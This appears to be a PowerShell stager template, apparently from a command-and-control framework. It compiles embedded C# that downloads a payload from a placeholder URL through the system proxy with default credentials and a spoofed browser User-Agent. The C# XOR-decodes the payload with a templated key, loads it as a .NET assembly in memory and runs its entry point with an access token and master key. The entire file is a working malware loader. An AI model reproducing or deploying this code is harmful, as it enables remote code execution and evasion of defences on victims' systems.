$$S = @"
using System;
using System.Net;
using System.Reflection;
namespace n {
public static class c {
public static void l() {
WebClient wc = new WebClient();
IWebProxy dp = WebRequest.DefaultWebProxy;
if (dp != null) {
    dp.Credentials = CredentialCache.DefaultCredentials;
    wc.Proxy = dp;
}
wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
byte[] b = wc.DownloadData("${stagePublicURL}");
string k = "${xorKey}";
for(int i = 0; i < b.Length; i++) { b[i] = (byte) (b[i] ^  k[i % k.Length]); }
string[] parameters = new string[] {"${accessToken}", "${masterKey}"};
object[] args = new object[] {parameters};
Assembly a = Assembly.Load(b);
MethodInfo method = a.EntryPoint;
object o = a.CreateInstance(method.Name);
method.Invoke(o, args); }}}
"@
Add-Type -TypeDefinition $$S -Language CSharp
[n.c]::l()
